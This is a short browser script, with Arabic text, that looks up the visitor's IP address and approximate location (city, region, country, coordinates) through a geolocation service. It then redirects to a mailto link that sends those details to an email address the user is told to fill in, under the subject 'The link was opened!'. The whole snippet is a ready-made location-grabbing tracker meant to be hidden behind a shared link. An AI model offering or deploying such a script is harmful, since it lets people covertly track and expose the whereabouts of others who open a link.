<script>
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    const info = `الموقع التقريبي: ${data.city}, ${data.region}, ${data.country_name} (الإحداثيات: ${data.latitude}, ${data.longitude}) | IP: ${data.ip}`;
    
    // أرسل البيانات إلى بريدك (استبدل YOUR_EMAIL@EXAMPLE.com)
    window.location.href = `mailto:YOUR_EMAIL@EXAMPLE.com?subject=تم فتح الرابط!&body=${encodeURIComponent(info)}`;
  });
</script>
